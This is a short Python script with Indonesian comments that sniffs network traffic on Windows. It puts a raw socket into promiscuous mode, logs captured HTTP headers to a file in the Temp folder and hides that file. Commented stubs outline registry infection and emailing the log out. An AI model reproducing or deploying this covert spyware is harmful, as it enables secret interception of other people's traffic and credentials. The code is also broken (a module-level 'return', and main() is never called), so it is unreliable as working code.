import socket
import os
import sys
import datetime
import subprocess
'''
class main_warden:
    def check_machine(self):
        global sock
        if os.name == "nt": #windows
            #Konfigurasi socket
            HOST = socket.gethostbyname(socket.gethostname())
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_IP)
            sock.bind((HOST,2441))
            sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
            sock.ioctl(socket.SIO_RCVALL,socket.RCVALL_ON)
            #Get User Directory
            '''
'''
            getname = socket.gethostname()
            if "-" in getname:
                name = getname.split("-")
                udir = name[0]
            else:
                udir = getname

            homedir = "C:/Users/"+udir+"/AppData/Local"
            '''
'''
        else :
            sys.exit() #exit klo mesin linux
'''
'''
    #def infect_reg(): #sek
    #...


    def ward(self):
        #result to txt
        result = "C:/Users/Default/AppData/Local/Temp/hasil.txt"
        #result send to email
'''

if os.name == "nt": #windows
    #Konfigurasi socket
    HOST = socket.gethostbyname(socket.gethostname())
    sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_IP)
    sock.bind((HOST,2441))
    sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    sock.ioctl(socket.SIO_RCVALL,socket.RCVALL_ON)

else:
    return

result = "C:/Users/Default/AppData/Local/Temp/hasil.txt"

def main():
	while True:
		try:
			data=sock.recvfrom(65535)
			conv=data[0].decode("utf-8", "replace").split("\r\n\r\n")
			if "HTTP" in conv[0][40:]:
				raw=conv[0][40:]
				xtime = datetime.datetime.now()
				print ("[","="*25,"HEADER CAPTURED","="*25,"]","\n","At :",xtime,"\n",raw, file=open(result, "a"))
			
			else:
				return
			#print(conv, file=open("hasile.txt", "a"))
			subprocess.check_call(["attrib", "+H", result])

		except Exception:
				continue

#disable promiscuous mode
#sock.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
